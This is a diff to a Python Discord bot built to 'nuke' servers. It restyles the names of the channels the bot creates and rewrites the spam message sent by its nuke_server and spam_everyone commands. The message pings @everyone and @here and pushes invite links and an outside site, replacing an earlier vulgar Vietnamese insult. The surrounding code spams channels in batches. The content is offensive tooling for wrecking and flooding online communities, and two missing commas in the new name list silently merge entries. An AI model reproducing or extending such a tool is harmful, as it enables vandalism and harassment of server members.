@@ -169,10 +169,12 @@ ROAST_LINES = [
 
 # ==================== HỆ THỐNG NUKE ====================
 NUKE_CHANNEL_NAMES = [
-    "NUKE BY LUNAL KINGDOM",
-    "NUKE BY BẢO ĐẸP ZAI",
-    "NUKE BY BOT NUKE ON TOP",
-    "DETROYED BY BOT NUKE EZ TOP"
+    "☠️☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝕎𝔸ℝ 𝔸ℝ𝕋☠️☠️",
+    "☠️☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀☠️☠️",
+    "☠️☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ☠️☠️",
+    "☠️☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ☠️☠️"
+    "☠️☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼𝔻 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆☠️☠️"
+    "☠️☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀☠️☠️"
 ]
 
 def is_bot_owner():
@@ -305,11 +307,11 @@ async def nuke_server(ctx):
         if log_channel:
             await log_channel.send(embed=discord.Embed(title="Spamming new channels...", color=0xFF0000))
         spam_content = (
-            "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
+            "# DETROYED BY BẢO ĐZ AND WAR ART (●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"link support 1: https://discord.gg/hqa3xAzsbk"\n'
-            ' "link support 2: https://discord.gg/j9KeGaPXh"'
+            '"|| link support 1 ||: https://xnhau.pics/"\n'
+            ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
         )
         all_channels = ctx.guild.text_channels
         batch_size = 5
@@ -401,11 +403,11 @@ async def spam_channels_error(ctx, error):
 async def spam_everyone(ctx):
     try:
         spam_content = (
-            "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
+            "# DETROYED BY BẢO ĐZ AND WAR ART (●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"link support 1: https://discord.gg/hqa3xAzsbk"\n'
-            ' "link support 2: https://discord.gg/j9KeGaPXh"'
+            '"|| link support 1 ||: https://xnhau.pics/"\n'
+            ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
         )
         embed = discord.Embed(
             title="🚀 KÍCH HOẠT SPAM @EVERYONE",
